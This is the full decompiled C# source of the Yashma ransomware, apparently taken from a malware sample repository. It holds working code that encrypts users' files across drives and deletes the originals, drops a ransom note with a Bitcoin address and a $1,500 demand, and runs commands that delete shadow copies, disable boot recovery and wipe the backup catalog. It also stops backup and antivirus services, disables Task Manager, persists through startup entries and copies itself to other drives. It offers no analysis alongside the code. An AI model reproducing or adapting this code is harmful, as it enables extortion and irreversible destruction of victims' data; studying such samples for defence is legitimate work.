// Decompiled with JetBrains decompiler
// Type: ConsoleApplication7.Program
// Assembly: yashma-encrypt, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B02439C3-4AEC-4EEC-A3B8-2DA8A0FEA15D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.Win32.Generic-7ff02d597c1d6d81252edc66749f979c3f61b5e2ebd76ecbbec75859c21baf83.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ConsoleApplication7
{
  internal class Program
  {
    private static readonly byte[] _salt = new byte[32];
    private static string userName = Environment.UserName;
    private static string userDir = "C:\\Users\\";
    public static string appMutexRun = "7z459ajrk722yn8c5j4fg";
    public static bool encryptionAesRsa = true;
    public static string encryptedFileExtension = "";
    private static bool checkSpread = true;
    private static string spreadName = "surprise.exe";
    private static bool checkCopyRoaming = true;
    private static string processName = "svchost.exe";
    public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";
    private static bool checkStartupFolder = true;
    private static bool checkSleep = false;
    private static int sleepTextbox = 10;
    private static string base64Image = "";
    public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";
    private static string droppedMessageTextbox = "read_it.txt";
    private static bool checkAdminPrivilage = true;
    private static bool checkdeleteShadowCopies = true;
    private static bool checkdisableRecoveryMode = true;
    private static bool checkdeleteBackupCatalog = true;
    private static bool disableTaskManager = true;
    private static bool checkStopBackupServices = true;
    public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";
    public static string appMutex2 = Program.appMutexStartup2 + Program.appMutexRun2;
    public static string staticSplit = "bc";
    public static string appMutex = Program.staticSplit + Program.appMutexStartup + Program.appMutexRun;
    public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");
    private static List<string> messages = new List<string>()
    {
      "All of your files have been encrypted with Yashma ransomware",
      "Your computer was infected with a ransomware. Your files have been encrypted and you won't ",
      "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ",
      "decryption software, this software will allow you to recover all of your data and remove the",
      "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.",
      "How do I pay, where do I get Bitcoin?",
      "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search",
      "yourself  to find out how to buy Bitcoin. ",
      "Many of our customers have reported these sites to be fast and reliable:",
      "Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com",
      "",
      "Payment informationAmount: 0.1473766 BTC",
      "Bitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0",
      ""
    };
    private static string[] validExtensions = new string[229]
    {
      ".txt",
      ".jar",
      ".dat",
      ".contact",
      ".settings",
      ".doc",
      ".docx",
      ".xls",
      ".xlsx",
      ".ppt",
      ".pptx",
      ".odt",
      ".jpg",
      ".mka",
      ".mhtml",
      ".oqy",
      ".png",
      ".csv",
      ".py",
      ".sql",
      ".mdb",
      ".php",
      ".asp",
      ".aspx",
      ".html",
      ".htm",
      ".xml",
      ".psd",
      ".pdf",
      ".xla",
      ".cub",
      ".dae",
      ".indd",
      ".cs",
      ".mp3",
      ".mp4",
      ".dwg",
      ".zip",
      ".rar",
      ".mov",
      ".rtf",
      ".bmp",
      ".mkv",
      ".avi",
      ".apk",
      ".lnk",
      ".dib",
      ".dic",
      ".dif",
      ".divx",
      ".iso",
      ".7zip",
      ".ace",
      ".arj",
      ".bz2",
      ".cab",
      ".gzip",
      ".lzh",
      ".tar",
      ".jpeg",
      ".xz",
      ".mpeg",
      ".torrent",
      ".mpg",
      ".core",
      ".pdb",
      ".ico",
      ".pas",
      ".db",
      ".wmv",
      ".swf",
      ".cer",
      ".bak",
      ".backup",
      ".accdb",
      ".bay",
      ".p7c",
      ".exif",
      ".vss",
      ".raw",
      ".m4a",
      ".wma",
      ".flv",
      ".sie",
      ".sum",
      ".ibank",
      ".wallet",
      ".css",
      ".js",
      ".rb",
      ".crt",
      ".xlsm",
      ".xlsb",
      ".7z",
      ".cpp",
      ".java",
      ".jpe",
      ".ini",
      ".blob",
      ".wps",
      ".docm",
      ".wav",
      ".3gp",
      ".webm",
      ".m4v",
      ".amv",
      ".m4p",
      ".svg",
      ".ods",
      ".bk",
      ".vdi",
      ".vmdk",
      ".onepkg",
      ".accde",
      ".jsp",
      ".json",
      ".gif",
      ".log",
      ".gz",
      ".config",
      ".vb",
      ".m1v",
      ".sln",
      ".pst",
      ".obj",
      ".xlam",
      ".djvu",
      ".inc",
      ".cvs",
      ".dbf",
      ".tbi",
      ".wpd",
      ".dot",
      ".dotx",
      ".xltx",
      ".pptm",
      ".potx",
      ".potm",
      ".pot",
      ".xlw",
      ".xps",
      ".xsd",
      ".xsf",
      ".xsl",
      ".kmz",
      ".accdr",
      ".stm",
      ".accdt",
      ".ppam",
      ".pps",
      ".ppsm",
      ".1cd",
      ".3ds",
      ".3fr",
      ".3g2",
      ".accda",
      ".accdc",
      ".accdw",
      ".adp",
      ".ai",
      ".ai3",
      ".ai4",
      ".ai5",
      ".ai6",
      ".ai7",
      ".ai8",
      ".arw",
      ".ascx",
      ".asm",
      ".asmx",
      ".avs",
      ".bin",
      ".cfm",
      ".dbx",
      ".dcm",
      ".dcr",
      ".pict",
      ".rgbe",
      ".dwt",
      ".f4v",
      ".exr",
      ".kwm",
      ".max",
      ".mda",
      ".mde",
      ".mdf",
      ".mdw",
      ".mht",
      ".mpv",
      ".msg",
      ".myi",
      ".nef",
      ".odc",
      ".geo",
      ".swift",
      ".odm",
      ".odp",
      ".oft",
      ".orf",
      ".pfx",
      ".p12",
      ".pl",
      ".pls",
      ".safe",
      ".tab",
      ".vbs",
      ".xlk",
      ".xlm",
      ".xlt",
      ".xltm",
      ".svgz",
      ".slk",
      ".tar.gz",
      ".dmg",
      ".ps",
      ".psb",
      ".tif",
      ".rss",
      ".key",
      ".vob",
      ".epsp",
      ".dc3",
      ".iff",
      ".onepkg",
      ".onetoc2",
      ".opt",
      ".p7b",
      ".pam",
      ".r3d"
    };
    private static Random random = new Random();

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    private static void Main(string[] args)
    {
      if (Program.forbiddenCountry())
      {
        int num = (int) MessageBox.Show("Forbidden Country");
      }
      else if (Program.isOver())
      {
        new Thread((ThreadStart) (() => Program.Run())).Start();
      }
      else
      {
        if (Program.AlreadyRunning())
          Environment.Exit(1);
        if (Program.checkSleep)
          Program.sleepOutOfTempFolder();
        if (Program.checkAdminPrivilage)
          Program.copyResistForAdmin(Program.processName);
        else if (Program.checkCopyRoaming)
          Program.copyRoaming(Program.processName);
        if (Program.checkStartupFolder)
          Program.addLinkToStartup();
        Program.lookForDirectories();
        if (Program.checkAdminPrivilage)
        {
          if (Program.checkdeleteShadowCopies)
            Program.deleteShadowCopies();
          if (Program.checkdisableRecoveryMode)
            Program.disableRecoveryMode();
          if (Program.checkdeleteBackupCatalog)
            Program.deleteBackupCatalog();
          if (Program.disableTaskManager)
            Program.DisableTaskManager();
          if (Program.checkStopBackupServices)
            Program.stopBackupServices();
        }
        if (Program.checkSpread)
          Program.spreadIt(Program.spreadName);
        Program.addAndOpenNote();
        Program.SetWallpaper(Program.base64Image);
        new Thread((ThreadStart) (() => Program.Run())).Start();
      }
    }

    public static void Run() => Application.Run((Form) new driveNotification.NotificationForm());

    private static bool forbiddenCountry()
    {
      string[] strArray = new string[2]
      {
        "az-Latn-AZ",
        "tr-TR"
      };
      foreach (string str in strArray)
      {
        try
        {
          if (InputLanguage.CurrentInputLanguage.Culture.Name == str)
            return true;
        }
        catch
        {
        }
      }
      return false;
    }

    private static void sleepOutOfTempFolder()
    {
      if (!(Path.GetDirectoryName(Assembly.GetEntryAssembly().Location) != Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
        return;
      Thread.Sleep(Program.sleepTextbox * 1000);
    }

    private static bool AlreadyRunning()
    {
      Process[] processes = Process.GetProcesses();
      Process currentProcess = Process.GetCurrentProcess();
      foreach (Process process in processes)
      {
        try
        {
          if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location)
          {
            if (currentProcess.Id != process.Id)
              return true;
          }
        }
        catch (Exception ex)
        {
        }
      }
      return false;
    }

    public static string RandomString(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
      {
        char ch = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
        stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    public static string RandomStringForExtension(int length)
    {
      if (!(Program.encryptedFileExtension == ""))
        return Program.encryptedFileExtension;
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < length; ++index)
      {
        char ch = "abcdefghijklmnopqrstuvwxyz0123456789"[Program.random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
        stringBuilder.Append(ch);
      }
      return stringBuilder.ToString();
    }

    public static string Base64EncodeString(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static void encryptDirectory(string location)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      Program.\u003C\u003Ec__DisplayClass7 cDisplayClass7_1 = new Program.\u003C\u003Ec__DisplayClass7();
      // ISSUE: reference to a compiler-generated field
      cDisplayClass7_1.location = location;
      try
      {
        // ISSUE: reference to a compiler-generated field
        string[] files = Directory.GetFiles(cDisplayClass7_1.location);
        bool checkCrypted = true;
        Parallel.For(0, files.Length, (Action<int>) (i =>
        {
          try
          {
            // ISSUE: variable of a compiler-generated type
            Program.\u003C\u003Ec__DisplayClass7 cDisplayClass7 = cDisplayClass7_1;
            string extension = Path.GetExtension(files[i]);
            string fileName = Path.GetFileName(files[i]);
            if (!Array.Exists<string>(Program.validExtensions, (Predicate<string>) (E => E == extension.ToLower())) || !(fileName != Program.droppedMessageTextbox))
              return;
            FileInfo fileInfo = new FileInfo(files[i]);
            try
            {
              fileInfo.Attributes = FileAttributes.Normal;
            }
            catch
            {
            }
            string password = Program.CreatePassword(40);
            if (fileInfo.Length < 1368709120L)
            {
              if (Program.checkDirContains(files[i]))
              {
                string keyRSA = Program.RSA_Encrypt(password, Program.rsaKey());
                Program.AES_Encrypt(files[i], password, keyRSA);
              }
            }
            else
              Program.AES_Encrypt_Large(files[i], password, fileInfo.Length);
            if (!checkCrypted)
              return;
            checkCrypted = false;
            string path = location + "/" + Program.droppedMessageTextbox;
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
            if (File.Exists(path) || !(location != folderPath))
              return;
            File.WriteAllLines(path, (IEnumerable<string>) Program.messages);
          }
          catch (Exception ex)
          {
          }
        }));
        // ISSUE: reference to a compiler-generated field
        string[] childDirectories = Directory.GetDirectories(cDisplayClass7_1.location);
        Parallel.For(0, childDirectories.Length, (Action<int>) (i =>
        {
          try
          {
            new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
          }
          catch
          {
          }
          Program.encryptDirectory(childDirectories[i]);
        }));
      }
      catch (Exception ex)
      {
      }
    }

    private static bool checkDirContains(string directory)
    {
      directory = directory.ToLower();
      string[] strArray = new string[16]
      {
        "appdata\\local",
        "appdata\\locallow",
        "users\\all users",
        "\\ProgramData",
        "boot.ini",
        "bootfont.bin",
        "boot.ini",
        "iconcache.db",
        "ntuser.dat",
        "ntuser.dat.log",
        "ntuser.ini",
        "thumbs.db",
        "autorun.inf",
        "bootsect.bak",
        "bootmgfw.efi",
        "desktop.ini"
      };
      foreach (string str in strArray)
      {
        if (directory.Contains(str))
          return false;
      }
      return true;
    }

    public static string rsaKey()
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
      stringBuilder.AppendLine("<RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">");
      stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
      stringBuilder.AppendLine("  <Modulus>wczjj9xQ7Sj5uQNEinpECg3TjS2QVDkkX25LSyQByltlmC6YRnFqewNvOZwl9VZwAI35rJcjqm1PEj+ybMXbNXWIwaD74f9FiESQsnkUytqigGiCAB4Q6q2fUaNBLI2ThJl+G9D2xa6csK7WvZMdva0gNJu4Nntb8+qDLX7o6JEHM+wF0HGAEgAqixfjdy7RFrdlps82QEGqjT6weebri3l0dFSnnfpIOWPYpmsqGy73QD+Da8B/dQu8rH8zpcEDjIWpZmCYtZjRmKbQTcLb0vGFYJZ6OAAOZIqJcXSIOFuwJLrBqYdxgFhXCp+QN9QwZGC7hO0dJ6AgZm82/SAhkw==</Modulus>");
      stringBuilder.AppendLine("</RSAParameters>");
      return stringBuilder.ToString();
    }

    public static string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      while (0 < length--)
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
      return stringBuilder.ToString();
    }

    private static void AES_Encrypt(string inputFile, string password, string keyRSA)
    {
      string path = inputFile + "." + Program.RandomStringForExtension(4);
      byte[] numArray = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      FileStream fileStream1 = new FileStream(path, FileMode.Create);
      byte[] bytes = Encoding.UTF8.GetBytes(password);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 128;
      rijndaelManaged.BlockSize = 128;
      rijndaelManaged.Padding = PaddingMode.PKCS7;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, numArray, 1);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      rijndaelManaged.Mode = CipherMode.CFB;
      fileStream1.Write(numArray, 0, numArray.Length);
      CryptoStream destination = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
      FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
      fileStream2.CopyTo((Stream) destination);
      fileStream2.Flush();
      fileStream2.Close();
      destination.Flush();
      destination.Close();
      fileStream1.Close();
      using (FileStream fileStream3 = new FileStream(path, FileMode.Append, FileAccess.Write))
      {
        using (StreamWriter streamWriter = new StreamWriter((Stream) fileStream3))
        {
          streamWriter.Write(keyRSA);
          streamWriter.Flush();
          streamWriter.Close();
        }
      }
      File.WriteAllText(inputFile, "?");
      File.Delete(inputFile);
    }

    private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
    {
      byte[] bytes = Encoding.ASCII.GetBytes(passwordBytes);
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      FileStream fileStream1 = new FileStream(inputFile + "." + Program.RandomStringForExtension(4), FileMode.Create);
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.KeySize = 256;
      rijndaelManaged.BlockSize = 128;
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
      rijndaelManaged.Padding = PaddingMode.Zeros;
      rijndaelManaged.Mode = CipherMode.CBC;
      using (CryptoStream destination = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
      {
        FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
        fileStream2.CopyTo((Stream) destination);
        fileStream2.Flush();
        destination.Flush();
        fileStream2.Close();
        destination.Close();
      }
      File.WriteAllText(inputFile, "?");
      File.Delete(inputFile);
    }

    private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
    {
      Program.GenerateRandomSalt();
      using (FileStream fileStream = new FileStream(inputFile + "." + Program.RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None))
      {
        fileStream.SetLength(lenghtBytes);
        File.WriteAllText(inputFile, "?");
        File.Delete(inputFile);
      }
    }

    public static byte[] GenerateRandomSalt()
    {
      byte[] data = new byte[32];
      using (RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider())
      {
        for (int index = 0; index < 10; ++index)
          cryptoServiceProvider.GetBytes(data);
      }
      return data;
    }

    public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
    {
      byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(2048))
      {
        try
        {
          cryptoServiceProvider.FromXmlString(publicKeyString.ToString());
          return Convert.ToBase64String(cryptoServiceProvider.Encrypt(bytes, true));
        }
        finally
        {
          cryptoServiceProvider.PersistKeyInCsp = false;
        }
      }
    }

    private static void lookForDirectories()
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
        if (drive.ToString() == pathRoot)
        {
          string[] array = new string[12]
          {
            "Program Files",
            "Program Files (x86)",
            "Windows",
            "$Recycle.Bin",
            "MSOCache",
            "Documents and Settings",
            "Intel",
            "PerfLogs",
            "Windows.old",
            "AMD",
            "NVIDIA",
            "ProgramData"
          };
          string[] directories = Directory.GetDirectories(pathRoot);
          for (int index = 0; index < directories.Length; ++index)
          {
            string dirName = new DirectoryInfo(directories[index]).Name;
            if (!Array.Exists<string>(array, (Predicate<string>) (E => E == dirName)))
              Program.encryptDirectory(directories[index]);
          }
        }
        else
          Program.encryptDirectory(drive.ToString());
      }
    }

    private static void copyRoaming(string processName)
    {
      string str1 = processName;
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
      string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str4 = str3 + str1;
      if (!(friendlyName != str1) && !(location != str4))
        return;
      if (!File.Exists(str4))
      {
        File.Copy(friendlyName, str4);
        if (!new Process()
        {
          StartInfo = new ProcessStartInfo(str4)
          {
            WorkingDirectory = str3
          }
        }.Start())
          return;
        Environment.Exit(1);
      }
      else
      {
        try
        {
          File.Delete(str4);
          Thread.Sleep(200);
          File.Copy(friendlyName, str4);
        }
        catch
        {
        }
        if (!new Process()
        {
          StartInfo = new ProcessStartInfo(str4)
          {
            WorkingDirectory = str3
          }
        }.Start())
          return;
        Environment.Exit(1);
      }
    }

    private static void copyResistForAdmin(string processName)
    {
      string str1 = processName;
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      string location = Assembly.GetExecutingAssembly().Location;
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
      string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
      string str4 = str3 + str1;
      ProcessStartInfo startInfo = new ProcessStartInfo(str4)
      {
        UseShellExecute = true,
        Verb = "runas",
        WindowStyle = ProcessWindowStyle.Normal,
        WorkingDirectory = str3
      };
      new Process().StartInfo = startInfo;
      if (!(friendlyName != str1) && !(location != str4))
        return;
      if (!File.Exists(str4))
      {
        File.Copy(friendlyName, str4);
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Program.copyResistForAdmin(processName);
        }
      }
      else
      {
        try
        {
          File.Delete(str4);
          Thread.Sleep(200);
          File.Copy(friendlyName, str4);
        }
        catch
        {
        }
        try
        {
          Process.Start(startInfo);
          Environment.Exit(1);
        }
        catch (Win32Exception ex)
        {
          if (ex.NativeErrorCode != 1223)
            return;
          Program.copyResistForAdmin(processName);
        }
      }
    }

    private static void addLinkToStartup()
    {
      using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Process.GetCurrentProcess().ProcessName + ".url"))
      {
        string location = Assembly.GetExecutingAssembly().Location;
        streamWriter.WriteLine("[InternetShortcut]");
        streamWriter.WriteLine("URL=file:///" + location);
        streamWriter.WriteLine("IconIndex=0");
        string str = location.Replace('\\', '/');
        streamWriter.WriteLine("IconFile=" + str);
      }
    }

    private static void addAndOpenNote()
    {
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
      try
      {
        if (!File.Exists(str))
          File.WriteAllLines(str, (IEnumerable<string>) Program.messages);
        Thread.Sleep(500);
        Process.Start(str);
      }
      catch
      {
      }
    }

    private static bool isOver()
    {
      string location = Assembly.GetExecutingAssembly().Location;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.processName;
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Program.droppedMessageTextbox;
      if (location != str)
      {
        try
        {
          File.Delete(path);
        }
        catch
        {
        }
      }
      return File.Exists(path) && location == str;
    }

    private static void registryStartup()
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Microsoft Store", (object) Assembly.GetExecutingAssembly().Location);
      }
      catch
      {
      }
    }

    private static void spreadIt(string spreadName)
    {
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.ToString() != Path.GetPathRoot(Environment.SystemDirectory))
        {
          if (!File.Exists(drive.ToString() + spreadName))
          {
            try
            {
              File.Copy(Assembly.GetExecutingAssembly().Location, drive.ToString() + spreadName);
            }
            catch
            {
            }
          }
        }
      }
    }

    private static void runCommand(string commands)
    {
      Process process = new Process();
      process.StartInfo = new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/C " + commands,
        WindowStyle = ProcessWindowStyle.Hidden
      };
      process.Start();
      process.WaitForExit();
    }

    private static void deleteShadowCopies() => Program.runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");

    private static void disableRecoveryMode() => Program.runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");

    private static void deleteBackupCatalog() => Program.runCommand("wbadmin delete catalog -quiet");

    public static void DisableTaskManager()
    {
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        subKey.SetValue("DisableTaskMgr", (object) "1");
        subKey.Close();
      }
      catch
      {
      }
    }

    private static void stopBackupServices()
    {
      string[] strArray = new string[42]
      {
        "BackupExecAgentBrowser",
        "BackupExecDiveciMediaService",
        "BackupExecJobEngine",
        "BackupExecManagementService",
        "vss",
        "sql",
        "svc$",
        "memtas",
        "sophos",
        "veeam",
        "backup",
        "GxVss",
        "GxBlr",
        "GxFWD",
        "GxCVD",
        "GxCIMgr",
        "DefWatch",
        "ccEvtMgr",
        "SavRoam",
        "RTVscan",
        "QBFCService",
        "Intuit.QuickBooks.FCS",
        "YooBackup",
        "YooIT",
        "zhudongfangyu",
        "sophos",
        "stc_raw_agent",
        "VSNAPVSS",
        "QBCFMonitorService",
        "VeeamTransportSvc",
        "VeeamDeploymentService",
        "VeeamNFSSvc",
        "veeam",
        "PDVFSService",
        "BackupExecVSSProvider",
        "BackupExecAgentAccelerator",
        "BackupExecRPCService",
        "AcrSch2Svc",
        "AcronisAgent",
        "CASAD2DWebSvc",
        "CAARCUpdateSvc",
        "TeamViewer"
      };
      foreach (string name in strArray)
      {
        try
        {
          new ServiceController(name).Stop();
        }
        catch
        {
        }
      }
    }

    public static void SetWallpaper(string base64)
    {
      if (!(base64 != ""))
        return;
      try
      {
        string str = Path.GetTempPath() + Program.RandomString(9) + ".jpg";
        File.WriteAllBytes(str, Convert.FromBase64String(base64));
        Program.SystemParametersInfo(20U, 0U, str, 3U);
      }
      catch
      {
      }
    }

    public static class NativeMethods
    {
      public const int clp = 797;
      public static IntPtr intpreclp = new IntPtr(-3);

      [DllImport("user32.dll", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool AddClipboardFormatListener(IntPtr hwnd);

      [DllImport("user32.dll", SetLastError = true)]
      public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }
  }
}
